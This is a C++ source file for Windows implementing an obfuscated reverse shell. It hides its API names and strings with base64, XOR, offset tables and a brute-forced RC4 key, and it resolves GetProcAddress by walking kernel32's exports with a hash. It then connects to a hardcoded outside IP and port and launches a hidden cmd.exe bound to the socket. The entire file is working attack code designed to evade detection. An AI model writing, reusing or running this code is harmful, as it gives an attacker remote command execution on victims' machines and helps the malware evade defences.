#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <stdio.h>
#include <Windows.h>
#include <iostream>
#include <cstring>
#include <vector>
#include <sstream>
#include <string>
#include <cstdint>
#pragma comment(lib, "ws2_32")
#define hardcodedHash 119979293

typedef FARPROC(WINAPI *GetProcAddressFunc)(HMODULE, LPCSTR);
typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI *LoadLibraryFunc)(LPCSTR);
typedef HMODULE(WINAPI *GetModuleHandleW_t)(LPCWSTR);
PCHAR g_crackedKey = nullptr;
const std::string encryptedBigString = "h3DhdCH8cbx27CGPfdqsPXT+GUiIr9KumzfaAwyR4Ojb8yy1je2bZChhOnq6TxqUnXHdOlQzL+PZoh03LTOmvDj2ug==";  // Encrypted alphabet string
const std::string encryptedKey = "rQ==";  // Encrypted 'K'
WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;
typedef SOCKET(WINAPI *WSASocketFunc)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);
using namespace std;

static const std::string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

std::string base64_decode(const std::string &in)
{
    std::string out;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++)
        T[base64_chars[i]] = i;

    int val = 0, valb = -8;
    for (unsigned char c : in)
    {
        if (T[c] == -1)
            break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0)
        {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

string deObfuscation(const vector<int> &offsets, const char *big_string)
{
    string result;
    for (int offset : offsets)
    {
        result += big_string[offset];
    }
    return result;
}

string simpleXOR(const string &data, char key)
{
    string result = data;
    for (size_t i = 0; i < data.size(); i++)
    {
        result[i] = data[i] ^ key;
    }
    return result;
}

string decodeString(const int *encoded, int size, const char *big_string, char key)
{
    // Deobfuscate the Base64 encoded string
    string base64Encoded;
    for (int i = 0; i < size; i++)
    {
        base64Encoded += big_string[encoded[i]];
    }

    // Decode Base64
    string decoded = base64_decode(base64Encoded);

    // Decrypt
    string decrypted = simpleXOR(decoded, key);

    // Parse back to vector<int>
    vector<int> decryptedOffsets;
    stringstream ss(decrypted);
    string token;
    while (getline(ss, token, ','))
    {
        if (!token.empty())
        {
            decryptedOffsets.push_back(stoi(token));
        }
    }

    // Final deobfuscation
    return deObfuscation(decryptedOffsets, big_string);
}

uint32_t GetHash(const std::string &functionName)
{
    uint32_t hash = 0;
    for (char c : functionName)
    {
        hash = (hash >> 13) | (hash << 19); // Rotate bits
        hash += c;
    }
    return hash;
}

void RC4(PCHAR key, PCHAR input, PCHAR output, DWORD length) {
    unsigned char S[256];
    int len = strlen(key);
    int j = 0;
    unsigned char tmp;
    for (int i = 0; i < 256; i++)
        S[i] = i;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + ((PUCHAR)key)[i % len]) % 256;
        tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
    }
    int i = 0;
    j = 0;
    for (int n = 0; n < length; n++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
        int rnd = S[(S[i] + S[j]) % 256];
        ((PUCHAR)output)[n] = rnd ^ ((PUCHAR)input)[n];
    }
}

unsigned int djb2Hash(const char* data, DWORD dataLength) {
    DWORD hash = 9876;
    for (int i = 0; i < dataLength; i++) {
        hash = ((hash << 5) + hash) + ((PBYTE)data)[i];
    }
    return hash;
}

PCHAR RecursiveCrack(PCHAR encryptedData, int encryptedDataLength, PCHAR key, int level) {
    char keySpace[] = "\x00""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    PCHAR decryptedData = new char[encryptedDataLength + 1]();
    for (int i = 0; i < sizeof(keySpace) - 1; i++) {
        if (level == 16) {
            if (!i) i++;
            key[16 - level] = keySpace[i];
            RC4(key, encryptedData, decryptedData, encryptedDataLength);

            if (djb2Hash(decryptedData, encryptedDataLength) == hardcodedHash) return key;
            if (i == sizeof(keySpace) - 2) return NULL;
        }
        else {
            key[16 - level] = keySpace[i];
            if (RecursiveCrack(encryptedData, encryptedDataLength, key, level + 1) != NULL) return key;
            else continue;
        }
    }
    delete[] decryptedData;
    return NULL;
}

PCHAR CrackKey(PCHAR encryptedData, int encryptedDataLength) {
    PCHAR key = new char[16]();
    RecursiveCrack(encryptedData, encryptedDataLength, key, 1);
    return key;
}

// Function to initialize the key once
void initializeGlobalKey(PCHAR encryptedData, int encryptedDataLength) {
    if (!g_crackedKey) {
        g_crackedKey = CrackKey(encryptedData, encryptedDataLength);
    }
}

wchar_t* decodeAndDecryptToWide(const std::string& encryptedString) {
    std::string decoded = base64_decode(encryptedString);
    size_t encryptedLength = decoded.length();
    
    char* decrypted = new char[encryptedLength + 1]();  // Zero-initialize the buffer
    RC4(g_crackedKey, (PCHAR)decoded.c_str(), decrypted, encryptedLength);
    decrypted[encryptedLength] = '\0';  // Explicitly null terminate
    
    size_t wideStrLength = encryptedLength + 1;
    wchar_t* wideStr = new wchar_t[wideStrLength]();
    
    // Convert to wide string and check for conversion errors
    size_t convertedChars = mbstowcs(wideStr, decrypted, encryptedLength);
    if (convertedChars == static_cast<size_t>(-1)) {
        delete[] decrypted;
        delete[] wideStr;
        return nullptr;  // Return null if conversion failed
    }
    
    delete[] decrypted;
    return wideStr;
}


int main(int argc, char *argv[])
{
    std::string base64EncodedBaseString = "uk6sTBTyb6d25SuPVMaqO2C8";
    std::string decodedBaseString = base64_decode(base64EncodedBaseString);
    int encryptedDataLength = strlen((PCHAR)decodedBaseString.c_str());
    initializeGlobalKey((PCHAR)decodedBaseString.c_str(), encryptedDataLength);
    wchar_t* decryptedBigString = decodeAndDecryptToWide(encryptedBigString);
    size_t convertedSize;
    char* big_string = new char[wcslen(decryptedBigString) + 1];
    wcstombs_s(&convertedSize, big_string, wcslen(decryptedBigString) + 1, decryptedBigString, _TRUNCATE);

    wchar_t* decryptedKey = decodeAndDecryptToWide(encryptedKey);
    char key = (char)*decryptedKey;

    delete[] decryptedBigString;
    delete[] decryptedKey;

    int c_p_o[] = {4, 49, 39, 13, 4, 13, 23, 13, 5, 56, 3, 61, 51, 57, 15, 24, 51, 57, 63, 13, 5, 57, 15, 13, 4, 13, 23, 13, 4, 13, 63, 13, 4, 48, 3, 65, 51, 57, 15, 25, 51, 57, 15, 25, 51, 57, 11, 63, 51, 22, 64, 64};                                                 // CreateProcessA
    int w_s_o[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 5, 57, 63, 13, 4, 13, 35, 13, 4, 56, 3, 60, 5, 32, 3, 60, 2, 12, 3, 59, 4, 56, 3, 60, 5, 12, 2, 64};                                                                                                       // WSAStartup
    int w_c_o[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 4, 49, 39, 13, 4, 13, 63, 13, 4, 13, 7, 13, 4, 13, 7, 13, 5, 56, 3, 59, 51, 57, 15, 24, 51, 22, 64, 64};                                                                                                   // WSAConnect
    int w_soc_offset[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 5, 57, 63, 13, 4, 13, 63, 13, 4, 48, 3, 60, 4, 56, 3, 65, 51, 57, 15, 24, 51, 22, 64, 64};                                                                                                          // WSASocket
    int h_t_o[] = {5, 32, 3, 60, 2, 12, 3, 60, 5, 56, 3, 60, 4, 32, 3, 60, 2, 56, 2, 64};                                                                                                                                                                                  // htons
    int i_a_o[] = {2, 56, 3, 60, 4, 32, 3, 65, 51, 57, 15, 24, 51, 57, 59, 58, 51, 57, 19, 13, 4, 32, 3, 58, 51, 57, 15, 62, 51, 22, 64, 64};                                                                                                                              // inet_addr
    int w_s_a_o[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 5, 57, 63, 13, 4, 13, 63, 13, 4, 48, 3, 60, 4, 56, 3, 65, 51, 57, 15, 24, 51, 57, 11, 63, 51, 22, 64, 64};                                                                                               // WSASocketA
    int w_f_s_o_o[] = {5, 57, 39, 13, 4, 56, 3, 25, 51, 57, 15, 24, 51, 57, 7, 60, 51, 57, 15, 65, 51, 57, 15, 62, 51, 57, 63, 65, 51, 57, 39, 13, 4, 13, 7, 13, 5, 48, 3, 60, 4, 12, 3, 65, 51, 57, 63, 61, 51, 57, 15, 13, 2, 12, 3, 65, 51, 57, 11, 13, 4, 13, 35, 13}; // WaitForSingleObject
    int ipaddr_offset[] = { 5, 13, 23, 13, 5, 13, 11, 13, 5, 49, 11, 13, 5, 13, 35, 13, 5, 13, 11, 13, 5, 13, 55, 13, 5, 13, 63, 13, 5, 13, 11, 13, 5, 49, 19, 13, 5, 13, 63, 13 }; // 13.250.113.37
    int exe_c_m_d[] = {4, 48, 3, 60, 4, 48, 3, 58, 51, 57, 59, 59, 51, 57, 63, 13, 4, 49, 7, 13, 5, 56, 2, 64};                                                                                                                               // cmd.exe
    short port = 6125;
    int w_s_2_32lld[] = {4, 49, 11, 13, 4, 13, 39, 13, 5, 13, 55, 13, 5, 13, 7, 13, 5, 13, 23, 13, 5, 13, 55, 13, 5, 13, 11, 13, 4, 32, 3, 60, 4, 12, 3, 60, 4, 12, 2, 64};                                                                          // ws2_32.dll
    int k_renel_32[] = {4, 13, 19, 13, 5, 56, 3, 60, 5, 32, 3, 60, 4, 32, 3, 65, 51, 57, 15, 60, 51, 57, 59, 62, 51, 57, 59, 63, 51, 57, 59, 59, 51, 57, 7, 13, 4, 13, 15, 13, 4, 13, 15, 13};                                                       // kernel32.dll
    int get_proc_addr[] = {4, 33, 11, 13, 5, 56, 3, 60, 2, 12, 3, 65, 4, 12, 3, 60, 5, 32, 3, 60, 5, 56, 3, 59, 51, 57, 11, 63, 51, 57, 7, 13, 4, 32, 3, 60, 5, 32, 3, 65, 51, 57, 15, 25, 51, 57, 15, 25, 51, 22, 64, 64};                          // GetProcAddress
    int g_et_mod_u_l_o_handelW[] = {4, 33, 11, 13, 5, 56, 3, 60, 2, 12, 3, 58, 2, 56, 3, 60, 5, 56, 3, 58, 51, 57, 11, 61, 51, 57, 15, 60, 51, 57, 63, 13, 4, 33, 7, 13, 4, 56, 3, 60, 4, 32, 3, 58, 51, 57, 15, 60, 51, 57, 63, 13, 5, 57, 39, 13}; // GetmoduleHandlew
    HMODULE w_s2_32lib = LoadLibraryA(decodeString(w_s_2_32lld, sizeof(w_s_2_32lld) / sizeof(w_s_2_32lld[0]), big_string, key).c_str());

    HMODULE ker_nel_32lld = LoadLibraryA(decodeString(k_renel_32, sizeof(k_renel_32) / sizeof(k_renel_32[0]), big_string, key).c_str());

    uint32_t targetHash = GetHash(decodeString(get_proc_addr, sizeof(get_proc_addr) / sizeof(get_proc_addr[0]), big_string, key).c_str());

    // Get the address of the Export Directory
    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)ker_nel_32lld;
    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE *)ker_nel_32lld + pDOSHeader->e_lfanew);
    DWORD exportDirectoryRVA = pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    // Get the Export Directory and its functions
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)ker_nel_32lld + exportDirectoryRVA);
    DWORD *functionNames = (DWORD *)((BYTE *)ker_nel_32lld + pExportDirectory->AddressOfNames);
    DWORD *functionAddresses = (DWORD *)((BYTE *)ker_nel_32lld + pExportDirectory->AddressOfFunctions);
    WORD *nameOrdinals = (WORD *)((BYTE *)ker_nel_32lld + pExportDirectory->AddressOfNameOrdinals);

    // Declare the GetProcAddress function pointer outside the loop
    pGetProcAddress GetProcAddressFn = nullptr;

    // Loop through the exports
    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++)
    {
        const char *functionName = (const char *)((BYTE *)ker_nel_32lld + functionNames[i]);
        uint32_t functionHash = GetHash(functionName);

        if (functionHash == targetHash)
        {
            // We've found the function we're looking for
            DWORD functionAddressRVA = functionAddresses[nameOrdinals[i]];
            GetProcAddressFn = (pGetProcAddress)((BYTE *)ker_nel_32lld + functionAddressRVA);
            break; // Exit the loop once we've found the function
        }
    }

    FARPROC w_sa_St_ar_tup = GetProcAddressFn(w_s2_32lib, decodeString(w_s_o, sizeof(w_s_o) / sizeof(w_s_o[0]), big_string, key).c_str());
    FARPROC Connectsaw = GetProcAddressFn(w_s2_32lib, decodeString(w_c_o, sizeof(w_c_o) / sizeof(w_c_o[0]), big_string, key).c_str());
    FARPROC wsaSocket = GetProcAddressFn(w_s2_32lib, decodeString(w_soc_offset, sizeof(w_soc_offset) / sizeof(w_soc_offset[0]), big_string, key).c_str());
    FARPROC htonsFunc = GetProcAddressFn(w_s2_32lib, decodeString(h_t_o, sizeof(h_t_o) / sizeof(h_t_o[0]), big_string, key).c_str());
    FARPROC inetAddr = GetProcAddressFn(w_s2_32lib, decodeString(i_a_o, sizeof(i_a_o) / sizeof(i_a_o[0]), big_string, key).c_str());

    reinterpret_cast<int(WINAPI *)(WORD, LPWSADATA)>(w_sa_St_ar_tup)(MAKEWORD(2, 2), &wsaData);

    // Those two lines are just used to convert the string 'ws2_32.dll' into a wide string, because that's the format the GetModuleHandle expect
    string original_ws_2_32_dl_l = decodeString(w_s_2_32lld, sizeof(w_s_2_32lld) / sizeof(w_s_2_32lld[0]), big_string, key).c_str();
    wstring wide_original_ws_2_32_dl_l(original_ws_2_32_dl_l.begin(), original_ws_2_32_dl_l.end());
    // ---
    GetModuleHandleW_t pGetModuleHandleW = (GetModuleHandleW_t)GetProcAddressFn(ker_nel_32lld, decodeString(g_et_mod_u_l_o_handelW, sizeof(g_et_mod_u_l_o_handelW) / sizeof(g_et_mod_u_l_o_handelW[0]), big_string, key).c_str());
    WSASocketFunc wsaSocketFunc = reinterpret_cast<WSASocketFunc>(
        GetProcAddressFn(pGetModuleHandleW(wide_original_ws_2_32_dl_l.c_str()),
                         decodeString(w_s_a_o, sizeof(w_s_a_o) / sizeof(w_s_a_o[0]), big_string, key).c_str()));

    wSock = wsaSocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);

    hax.sin_family = AF_INET;
    hax.sin_port = reinterpret_cast<u_short(__stdcall *)(u_short)>(htonsFunc)(port);
    hax.sin_addr.s_addr = reinterpret_cast<unsigned long(__stdcall *)(const char *)>(inetAddr)(
        decodeString(ipaddr_offset, sizeof(ipaddr_offset) / sizeof(ipaddr_offset[0]), big_string, key).c_str());

    reinterpret_cast<int(WINAPI *)(SOCKET, const struct sockaddr *, int, LPWSABUF, LPWSABUF,
                                   LPQOS, LPQOS, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE)>(Connectsaw)(
        wSock, reinterpret_cast<const sockaddr *>(&hax), sizeof(hax), nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);

    FARPROC createPr0cess = GetProcAddressFn(LoadLibraryA(decodeString(k_renel_32, sizeof(k_renel_32) / sizeof(k_renel_32[0]), big_string, key).c_str()),
                                             decodeString(c_p_o, sizeof(c_p_o) / sizeof(c_p_o[0]), big_string, key).c_str());
    FARPROC waitF0rSingleObject = GetProcAddressFn(LoadLibraryA(decodeString(k_renel_32, sizeof(k_renel_32) / sizeof(k_renel_32[0]), big_string, key).c_str()),
                                                   decodeString(w_f_s_o_o, sizeof(w_f_s_o_o) / sizeof(w_f_s_o_o[0]), big_string, key).c_str());

    STARTUPINFOA sui;
    PROCESS_INFORMATION pi;
    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.wShowWindow = SW_HIDE; // This makes the window invisible
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

    reinterpret_cast<BOOL(WINAPI *)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
                                    BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION)>(
        createPr0cess)(nullptr, const_cast<LPSTR>(decodeString(exe_c_m_d, sizeof(exe_c_m_d) / sizeof(exe_c_m_d[0]), big_string, key).c_str()), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &sui, &pi);

    reinterpret_cast<DWORD(WINAPI *)(HANDLE, DWORD)>(waitF0rSingleObject)(pi.hProcess, INFINITE);

    return 0;
}
